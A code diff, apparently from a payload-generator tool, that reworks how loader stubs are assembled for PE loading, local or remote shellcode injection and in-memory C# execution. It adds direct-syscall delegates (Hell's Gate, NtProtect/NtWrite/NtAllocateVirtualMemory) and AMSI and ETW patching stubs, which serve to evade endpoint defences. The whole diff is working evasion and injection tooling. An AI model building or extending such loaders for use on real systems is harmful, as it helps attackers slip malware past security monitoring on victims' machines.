@@ -703,8 +703,13 @@ if (hellsgate):
 if (peload):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
+    if ("myNtProtectVirtM = pro" in stub) == false:
+        stub.add(NtProtectVirtualMemoryDelegate)
+        stub.add(NtProtectSyscallStart)
+    if ("myNtWriteVirtM = proc" in stub) == false:
+        stub.add(NtWriteVirtualMemoryDelegate)
     if (AMSI):
-        stub = stub &  AMSIETWDelegates & AMSIStub
+        stub = stub & AMSIStub
         if(ETW):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
@@ -715,15 +720,24 @@ if (peload):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
             else:
-                stub = stub & AMSIETWDelegates & ETWPatchStub
+                stub = stub & ETWPatchStub
+
+    if ("myNtAllocateVirtM = pro" in stub) == false:
+        stub.add(NtAllocateVirtualMemoryDelegate)
     stub.add(ProtectWriteAllocSyscalls)
     stub.add(PELoadStub)
     shellcode = false
 if (shellcode):
     if ("PS_ATTR_UNION" in stub) == false:
         stub.add(GetSyscallStub)
+    if (AMSI or ETW):
+        if ("myNtProtectVirtM = pro" in stub) == false:
+            stub.add(NtProtectVirtualMemoryDelegate)
+            stub.add(NtProtectSyscallStart)
+        if ("myNtWriteVirtM = proc" in stub) == false:
+            stub.add(NtWriteVirtualMemoryDelegate)
     if (AMSI):
-        stub = stub &  AMSIETWDelegates & AMSIStub
+        stub = stub &  AMSIStub
         if(ETW):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
@@ -734,7 +748,7 @@ if (shellcode):
             if (COMVARETW):
                 stub = stub & ETWCOMVARStub
             else:
-                stub = stub & AMSIETWDelegates & ETWPatchStub
+                stub = stub & ETWPatchStub
     if(localinject):
         stub = stub & LocalInjectDelegates & ShellcodelocalStub
     else:
@@ -756,10 +770,15 @@ if (shellcode):
 
 if (csharp):
     stub.add(AssemblyImports)
-    if (AMSI):
+    if (AMSI or ETW):
         if ("PS_ATTR_UNION" in stub) == false:
             stub.add(GetSyscallStub)
-        stub.add(AMSIETWDelegates)
+        if ("myNtProtectVirtM = pro" in stub) == false:
+            stub.add(NtProtectVirtualMemoryDelegate)
+            stub.add(NtProtectSyscallStart)
+        if ("myNtWriteVirtM = proc" in stub) == false:
+            stub.add(NtWriteVirtualMemoryDelegate)
+    if (AMSI):
         stub.add(AMSIStub)
         if(ETW):
             if (COMVARETW):
@@ -773,7 +792,6 @@ if (csharp):
             else:
                 if ("PS_ATTR_UNION" in stub) == false:
                     stub.add(GetSyscallStub)
-                stub.add(AMSIETWDelegates)
                 stub.add(ETWPatchStub)
     echo "adding Stub:"
     if (noArgs):
